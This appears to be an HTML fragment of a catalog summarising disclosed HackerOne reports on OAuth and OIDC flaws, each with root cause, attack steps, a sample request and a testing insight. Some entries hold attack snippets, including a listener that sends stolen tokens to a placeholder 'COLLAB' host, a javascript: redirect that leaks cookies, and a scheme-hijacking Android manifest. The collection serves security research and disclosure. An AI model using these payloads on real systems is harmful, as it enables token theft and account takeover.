+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth login CSRF / session fixation via reusable, session-unbound oauth_token</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#46485</b> · x · USD 1260 · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>unbound oauth_token -&gt; victim authorization -&gt; attacke</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth request token in the /oauth/authenticate URL was not bound to the browser session that initiated it, so a token authorized by one account could be consumed by a different browser to complete login as that account.</p>
+<h4>Method</h4><ol><li>Attacker starts 'Sign in with Twitter' on a relying-party site and captures the oauth_token authorize URL</li><li>Attacker gets the victim (or a controlled second account) to authorize that exact oauth_token</li><li>Attacker's original browser refreshes/continues the flow and is now logged into the relying party as the authorizing account</li></ol>
+<div class="pre">https://api.twitter.com/oauth/authenticate?oauth_token=ATTACKER_INITIATED_TOKEN
+# authorized in victim's browser, then completed in attacker's browser</div>
+<p class="insight"><b>Insight —</b> In OAuth/SSO flows, test whether the request token / state is bound to the initiating session and single-use. If the same authorize URL works across browsers, you have login CSRF / session fixation. Always check for a per-session, single-use state/nonce.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/46485" target="_blank" rel="noopener">hackerone.com/reports/46485</a></span><a class="src" href="#report-46485" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-92472" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token theft via postMessage wildcard target origin</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#92472</b> · bumble · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>bumble</b></span><span>Surface <b>web</b></span><span>Chain <b>postMessage '*' token leak -&gt; stolen provider access_toke</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An OAuth callback page reads access_token/token/code from its URL and forwards them to window.opener via postMessage(message,'*'); the '*' target origin means any page that opened the popup, including an attacker origin, receives the token.</p>
+<h4>Method</h4><ol><li>Find the OAuth relay/callback page (e.g. cb.html) that does window.opener.postMessage(tokenData,'*').</li><li>From an attacker page, window.open() the social-login flow so your page is the opener.</li><li>Add a message listener; when the victim completes login the token is delivered to your origin.</li><li>Replay the stolen provider token against the target app's login to access the victim account.</li></ol>
+<div class="pre">// attacker opener.html
+window.addEventListener('message', e =&gt; {
+  fetch('https://COLLAB/steal?t=' + encodeURIComponent(JSON.stringify(e.data)));
+});
+window.open('https://mus1.badoo.com/cb.html', '_blank');</div>
+<p class="insight"><b>Insight —</b> Grep OAuth/SSO relay pages for postMessage(...,'*'). A wildcard target origin turns any token relay into a cross-origin token leak. The fix is to pin the exact origin; the attack is to become window.opener and listen.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/92472" target="_blank" rel="noopener">hackerone.com/reports/92472</a></span><a class="src" href="#report-92472" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-279935" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth callback URL validated only client-side</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#279935</b> · inflection · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>inflection</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Application-registration form validates the OAuth callback/redirect URL only in JavaScript; the backend has no server-side validation, so an intercepting proxy can register a malicious callback.</p>
+<h4>Method</h4><ol><li>Start creating an OAuth application/identity and enter a malicious callback URL.</li><li>JS blocks form submission; intercept the request in a proxy and forward it anyway.</li><li>Backend accepts the arbitrary callback -&gt; tokens/codes can be redirected to attacker.</li></ol>
+<div class="pre">POST /identity/applications HTTP/1.1
+
+name=evil&amp;callback_url=https://attacker.com/collect  # JS-only check bypassed via proxy</div>
+<p class="insight"><b>Insight —</b> Whenever a field is 'validated' in the browser (redirect_uri, webhook URL, avatar URL, email), resend it via proxy with a hostile value. Client-only redirect_uri validation is a classic route to open redirect / OAuth token theft.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/279935" target="_blank" rel="noopener">hackerone.com/reports/279935</a></span><a class="src" href="#report-279935" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-55911" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth state (CSRF token) is static/reusable -&gt; account-connection CSRF</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#55911</b> · shopify · 500 · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>static OAuth state -&gt; connection CSRF -&gt; attacker Face</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth 'state' parameter used to bind the 'Connect with Facebook' callback to the user is fixed and does not change across authorizations, so an attacker who knows it can forge the callback URL and connect the attacker's Facebook account to the victim's Shopify account.</p>
+<h4>Method</h4><ol><li>Start the 'Connect with Facebook' flow and capture the OAuth request; note the state value</li><li>Re-run the flow and confirm state does NOT rotate (same value every time)</li><li>Authorize with the ATTACKER's Facebook to obtain an attacker code</li><li>Craft a callback link /authenticated?code=ATTACKER_CODE&amp;state=STATIC_STATE and trick the logged-in victim into loading it</li><li>Victim's account is now linked to the attacker's Facebook (attacker can log in as victim)</li></ol>
+<div class="pre">&lt;a href="https://facebookstore.shopifyapps.com/authenticated?code=[ATTACKER_TOKEN]&amp;state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_"&gt;click&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Always verify the OAuth state parameter is unpredictable AND single-use per authorization. If state is constant across requests (or omitted/not validated), the callback is CSRFable: authorize with your own IdP account and force the victim to complete YOUR callback, linking your identity to their account - a login/connection CSRF leading to account takeover.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/55911" target="_blank" rel="noopener">hackerone.com/reports/55911</a></span><a class="src" href="#report-55911" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-104931" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth account-linking CSRF via missing state parameter</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#104931</b> · shopify · awarded · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>missing state -&gt; replay attacker callback in victim sessi</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth connect/callback flow does not use (or validate) the state parameter, so an attacker can pre-authorize with their own provider account, capture the callback URL, and get the victim to load it -- binding the attacker's third-party account to the victim's account (or replacing the victim's existing linked account).</p>
+<h4>Method</h4><ol><li>As attacker, start 'connect provider' (Pinterest) on the target and authorize with the attacker's provider account.</li><li>Intercept and drop the redirect back to the app; save the callback URL containing the attacker's code (e.g. /auth/pinterest/callback?code=...).</li><li>Lure the logged-in victim to load that callback URL.</li><li>The attacker's provider account is now linked to the victim's app account, even overwriting a previously connected account.</li></ol>
+<div class="pre">https://pinterest-commerce.shopifyapps.com/auth/pinterest/callback?code=&lt;attacker_code&gt;</div>
+<p class="insight"><b>Insight —</b> Any social/account-linking OAuth callback with no state (or state not tied to the victim's session) is CSRF-able. Test by completing the attacker-side authorization, dropping the final redirect, and replaying the callback URL in the victim's session. Impact: attacker-controlled linked account -&gt; later login/data access. Fix is a per-session, validated state value.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/104931" target="_blank" rel="noopener">hackerone.com/reports/104931</a></span><a class="src" href="#report-104931" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-118737" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Login CSRF via OAuth with unvalidated state (victim logged into attacker account)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#118737</b> · thisdata · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>thisdata</b></span><span>Surface <b>web</b></span><span>Chain <b>unvalidated OAuth state -&gt; victim logged into attacker ac</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth login callback does not validate the state parameter, so an attacker can complete their own OAuth authorization, capture code+state, and feed the victim /oauth/redirect?state=...&amp;code=..., silently logging the victim into the attacker's account.</p>
+<h4>Method</h4><ol><li>Attacker initiates Google OAuth login with the app and authorizes with the attacker's Google account.</li><li>Attacker records and drops the redirect to the app so the code is not consumed.</li><li>Attacker directs the victim to /oauth/redirect?state=&lt;attacker_state&gt;&amp;code=&lt;attacker_code&gt;.</li><li>Victim is now authenticated as the attacker; anything the victim saves (payment info, notes, address) lands in the attacker-controlled account.</li></ol>
+<div class="pre">https://TARGET/oauth/redirect?state=&lt;attacker_state&gt;&amp;code=&lt;attacker_code&gt;</div>
+<p class="insight"><b>Insight —</b> Login CSRF and account-linking CSRF share one root cause: an OAuth flow whose state is missing or not bound to the victim's session. For login CSRF specifically, confirm impact by logging the victim into an attacker account and showing the victim's later actions are attributed to the attacker. Plain form-based login CSRF (no token on the login POST) is the simpler cousin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/118737" target="_blank" rel="noopener">hackerone.com/reports/118737</a></span><a class="src" href="#report-118737" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-434763" style="--sv:var(--sev-med)" data-sev="2" data-votes="80" data-bounty="2940">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth consent screen misrepresents actual granted scopes</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#434763</b> · x · 2940 · 80 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">For certain first-party client keys / PIN (out-of-band) OAuth flows, the consent dialog rendered scopes that did not match the tokens' real capabilities, so an app the screen claimed could NOT read DMs could in fact read them.</p>
+<h4>Method</h4><ol><li>Use leaked/official first-party client keys via a non-standard flow (PIN/xAuth)</li><li>Observe the consent screen understates permissions (e.g. 'cannot access direct messages')</li><li>Complete authorization and exercise the API to confirm the token actually has the broader scope</li></ol>
+<p class="insight"><b>Insight —</b> Never trust the consent UI as ground truth for granted scope. Diff what the screen claims against what the issued token can actually do (call privileged endpoints). Legacy/first-party keys and non-standard flows (PIN/device/xAuth) commonly desync the displayed scope.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/434763" target="_blank" rel="noopener">hackerone.com/reports/434763</a></span><a class="src" href="#report-434763" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-2021684" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OIDC token issuer (iss) not validated against discovery issuer</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2021684</b> · nextcloud · awarded · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>missing iss validation -&gt; token substitution / MITM -&gt;</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OIDC login flow does not verify that the iss claim of the obtained ID token matches the issuer discovered during provider configuration, so a token from a different/attacker issuer can be accepted (ID Token Validation step 2 of the OIDC spec is skipped).</p>
+<h4>Method</h4><ol><li>Review an OIDC/OpenID Connect relying-party implementation's token validation.</li><li>Check whether it verifies iss (and aud, exp, nonce) against the discovered provider metadata.</li><li>If iss is unchecked, a MITM or a token minted by another IdP can be substituted and accepted as a valid login.</li></ol>
+<p class="insight"><b>Insight —</b> When auditing OIDC/OAuth relying parties, enumerate the ID-token checks: iss must equal the discovery issuer, aud must contain the client_id, plus exp/nonce/signature. A missing iss check is a token-substitution/MITM auth flaw even when aud is validated. Grep for the discovery issuer being compared to the token's iss.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2021684" target="_blank" rel="noopener">hackerone.com/reports/2021684</a></span><a class="src" href="#report-2021684" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-3316910" style="--sv:var(--sev-low)" data-sev="1" data-votes="50" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Second-order XSS via javascript: OAuth redirect_uri -&gt; ATO</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#3316910</b> · cloudflare · awarded · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Chain <b>malicious client registration -&gt; stored javascript: redir</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The MCP server portal OAuth provider stored redirect_uri without sanitizing the scheme; an attacker registers a client whose redirect_uri is a javascript: URL, then triggers /authorize with a victim session so the stored javascript: URI executes.</p>
+<h4>Method</h4><ol><li>Register/obtain a client_id whose redirect_uri contains a javascript: payload</li><li>Lure a victim with an active auth session to the /authorize endpoint for that client</li><li>Stored javascript: redirect executes in the portal origin -&gt; session/account takeover</li></ol>
+<div class="pre"># redirect_uri registered as e.g.:
+javascript:fetch('https://COLLAB/?c='+document.cookie)</div>
+<p class="insight"><b>Insight —</b> On OAuth/MCP flows, test whether redirect_uri scheme is validated at registration AND at redirect time. A stored javascript: redirect_uri is a second-order XSS sink; reuse it against an authenticated victim on /authorize.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3316910" target="_blank" rel="noopener">hackerone.com/reports/3316910</a></span><a class="src" href="#report-3316910" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1784162" style="--sv:var(--sev-low)" data-sev="1" data-votes="45" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth2 authorization_code with no expiry (indefinite redemption)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1784162</b> · nextcloud · 100 · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>code leak (referrer/log/open-redirect) -&gt; late redemption</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth2 authorization endpoint stored the authorization_code with no timeout, contrary to RFC 6749 (recommended &lt;=10 min, single-use). A code leaked via logs/referrer/history can be redeemed arbitrarily far in the future.</p>
+<h4>Method</h4><ol><li>Obtain an authorization_code from the OAuth flow</li><li>Wait well beyond the RFC-recommended 10 minutes</li><li>Exchange it at the token endpoint — it still succeeds</li></ol>
+<div class="pre">POST /token
+grant_type=authorization_code&amp;code=&lt;old_code&gt;&amp;redirect_uri=...&amp;client_id=...</div>
+<p class="insight"><b>Insight —</b> Always test OAuth authorization_code lifetime and single-use: (1) redeem after a long delay, (2) redeem the same code twice. Non-expiring or replayable codes turn any code leak (referrer header, logs, open redirect on redirect_uri) into account access.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1784162" target="_blank" rel="noopener">hackerone.com/reports/1784162</a></span><a class="src" href="#report-1784162" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-292783" style="--sv:var(--sev-low)" data-sev="1" data-votes="43" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth code leak via unrestricted redirect_uri path + Referer exfiltration</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#292783</b> · ed · none · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>ed</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri path abuse -&gt; unconsumed code -&gt; Referer </b></span><span>Tag <b>oauth</b></span><span>Tag <b>open-redirect</b></span></div>
+<h4>Root cause</h4><p style="margin:0">redirect_uri validation whitelists the whole domain but not the path, so the code can be delivered to any page. Routing it to a page WITHOUT the code-consuming widget prevents the code from being exchanged/stripped, leaving it live in the URL to leak via the Referer header on outbound links.</p>
+<h4>Method</h4><ol><li>Confirm the app strips/exchanges code only on specific pages (the comment-widget page).</li><li>Set redirect_uri to an arbitrary same-domain path (/about/, /metadata) that has no widget, so code survives.</li><li>That page contains external links (twitter, youtube, press sites); user interaction leaks the still-valid code to those hosts via Referer.</li></ol>
+<div class="pre">https://github.com/login?client_id=CLIENT&amp;return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3DCLIENT%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252Fabout%252f%26scope%3Dpublic_repo</div>
+<p class="insight"><b>Insight —</b> Even when redirect_uri host is locked, path freedom is exploitable: pick a landing page that does NOT consume the code, then harvest it via Referer to any external resource/link on that page.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/292783" target="_blank" rel="noopener">hackerone.com/reports/292783</a></span><a class="src" href="#report-292783" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-1700734" style="--sv:var(--sev-low)" data-sev="1" data-votes="29" data-bounty="900">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth code interception via duplicate mobile URL scheme (no PKCE)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1700734</b> · shopify · USD 900 · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>mobile-android</b></span><span>Chain <b>scheme hijack -&gt; intercept auth code -&gt; token exchange</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A mobile OAuth flow returns the authorization code to a custom URL scheme (shopapp://) without PKCE; a malicious app registering the same scheme intercepts the code and exchanges it for a token (or links the victim account to the attacker).</p>
+<h4>Method</h4><ol><li>Build a malicious app that registers the same custom scheme as the target app</li><li>Victim completes the legit OAuth login; OS routes the redirect to the malicious app (iOS first-come-first-served; Android shows a chooser)</li><li>Malicious app receives the authorization code and exchanges it at the token endpoint for account access</li></ol>
+<div class="pre"># Malicious AndroidManifest intent-filter claiming the victim scheme:
+&lt;intent-filter&gt;
+  &lt;action android:name="android.intent.action.VIEW"/&gt;
+  &lt;category android:name="android.intent.category.DEFAULT"/&gt;
+  &lt;category android:name="android.intent.category.BROWSABLE"/&gt;
+  &lt;data android:scheme="shopapp"/&gt;
+&lt;/intent-filter&gt;</div>
+<p class="insight"><b>Insight —</b> When testing mobile OAuth, check whether the redirect uses a custom scheme/deep link and whether PKCE (code_challenge/code_verifier) is present. Custom-scheme redirect + no PKCE = interceptable authorization code. Prefer claimed https App Links and require PKCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1700734" target="_blank" rel="noopener">hackerone.com/reports/1700734</a></span><a class="src" href="#report-1700734" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-972601" style="--sv:var(--sev-low)" data-sev="1" data-votes="29" data-bounty="200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth authorize error path redirects to attacker redirect_uri (invalid scope)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#972601</b> · pixiv · USD 200 · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>pixiv</b></span><span>Surface <b>web</b></span><span>Chain <b>open redirect on OAuth authorize -&gt; potential code/token </b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">On the OAuth authorize endpoint, supplying an invalid scope triggers an error redirect that honors the attacker-supplied redirect_uri without allowlist validation, redirecting the user to an arbitrary domain.</p>
+<h4>Method</h4><ol><li>Call /oauth/authorize with a valid client_id but a bogus scope value.</li><li>Set redirect_uri to an attacker domain.</li><li>The error path redirects to the attacker redirect_uri.</li></ol>
+<div class="pre">https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=VALID&amp;redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&amp;response_type=code&amp;scope=ggg&amp;state=...</div>
+<p class="insight"><b>Insight —</b> redirect_uri allowlisting is often only enforced on the happy path. Trigger error branches (invalid scope, response_type, missing param) to see if the app still redirects to an unvalidated redirect_uri.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/972601" target="_blank" rel="noopener">hackerone.com/reports/972601</a></span><a class="src" href="#report-972601" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-202177" style="--sv:var(--sev-low)" data-sev="1" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Google id_token accepted without audience validation</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#202177</b> · instacart · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>instacart</b></span><span>Surface <b>api</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Backend accepts a Google-issued id_token without verifying the token's aud (audience/client_id) belongs to this app, so an id_token minted for any other Google OAuth app is accepted.</p>
+<h4>Method</h4><ol><li>Log into an unrelated app (e.g. Meetup) via Google Sign-In and capture its id_token</li><li>POST that id_token to the target's Google login endpoint</li><li>Backend accepts it and logs you in / links the account</li></ol>
+<div class="pre">POST /api/v2/users/google_login_auth
+access_token=...&amp;client_id=...&amp;id_token=&lt;GOOGLE_ID_TOKEN_FROM_ANOTHER_APP&gt;&amp;login_only=...&amp;read_terms=...</div>
+<p class="insight"><b>Insight —</b> For any 'Sign in with Google/Apple/Facebook' backend, test whether an id_token issued to a DIFFERENT client_id is accepted. Server must verify signature AND that aud == its own client_id (and iss). Missing aud check = cross-app token replay -&gt; ATO.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/202177" target="_blank" rel="noopener">hackerone.com/reports/202177</a></span><a class="src" href="#report-202177" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-244958" style="--sv:var(--sev-low)" data-sev="1" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token leak via unvalidated next= open redirect</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#244958</b> · wakatime · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>wakatime</b></span><span>Surface <b>web</b></span><span>Chain <b>open redirect -&gt; OAuth token leak -&gt; account access</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth authorize endpoint honours an attacker-controlled next/redirect parameter without whitelisting; changing it sends the flow (and the OAuth token in the URL) to an attacker-chosen destination.</p>
+<h4>Method</h4><ol><li>Take a legitimate OAuth authorize URL with next=/some/legit/path</li><li>Change next= to an attacker-controlled path/profile</li><li>Complete the flow; the OAuth token is appended to the redirected URL and leaked</li></ol>
+<div class="pre">https://TARGET/oauth/twitter/authorize?reason=tweet&amp;next=/@ATTACKER_CONTROLLED</div>
+<p class="insight"><b>Insight —</b> Any redirect-back parameter in an OAuth/SSO flow (next, return, redirect_uri, state-as-url) must be validated against a strict allowlist; otherwise it doubles as a token/code exfiltration channel. Classic open-redirect-in-auth pattern (cf. #140432).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/244958" target="_blank" rel="noopener">hackerone.com/reports/244958</a></span><a class="src" href="#report-244958" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-194832" style="--sv:var(--sev-low)" data-sev="1" data-votes="12" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Internal 'Login with Google' accepts any Google account (no hosted-domain restriction)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#194832</b> · shopify · awarded · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internal/VPN app authenticated via Google OAuth but did not restrict the accepted accounts to the corporate G Suite domain, so any personal Google account could log in. A prior fix on a sibling host had not been applied to this subdomain.</p>
+<h4>Method</h4><ol><li>Find an internal service offering 'Sign in with Google'</li><li>Authenticate with an arbitrary non-corporate Google account</li><li>Observe access granted because the hosted-domain (hd) / email-domain is not verified server-side</li></ol>
+<p class="insight"><b>Insight —</b> Whenever an internal tool uses Google/Workspace SSO, check whether it enforces the hd claim / verifies the email domain after the OAuth callback. Missing domain enforcement = anyone with a Google account gets in. Also re-test sibling subdomains: fixes are often applied host-by-host and one is forgotten.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/194832" target="_blank" rel="noopener">hackerone.com/reports/194832</a></span><a class="src" href="#report-194832" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-223427" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Login via disconnected/old OAuth identity</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#223427</b> · weblate · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">After a user disconnected a linked Google account (e.g. because the Google account was compromised) and changed their email, the app still allowed authentication via that old, disconnected Google identity.</p>
+<h4>Method</h4><ol><li>Victim links Google login, then disconnects it and changes primary email</li><li>Attacker who controls the old Google account clicks 'Login with Google'</li><li>Attacker is logged into the victim's app account via the stale association</li></ol>
+<p class="insight"><b>Insight —</b> Test whether 'disconnect social login' actually severs the auth binding. Stale OAuth identity mappings that survive disconnection let a previously-authorized identity re-enter.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/223427" target="_blank" rel="noopener">hackerone.com/reports/223427</a></span><a class="src" href="#report-223427" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-134757" style="--sv:var(--sev-low)" data-sev="1" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Limited-scope staff bypasses OAuth app-install scope enforcement</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#134757</b> · shopify · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A staff member whose account lacks a permission (e.g. read_orders) is blocked with an OAuth scope error, yet can still complete installation of an app requesting that scope, effectively acquiring access beyond their granted permissions.</p>
+<h4>Method</h4><ol><li>As a limited staff member, begin installing an app that requests a scope you lack (read_orders)</li><li>Observe the 'do not have permission to access the requested scopes' error</li><li>Complete the install flow anyway; the app installs with the elevated scope</li></ol>
+<p class="insight"><b>Insight —</b> OAuth/app-install scope checks are a privilege boundary: verify the enforcement is not just a front-end error. A limited role that can still finalize an install with broader scopes escalates its effective permissions via the app's token.</p>
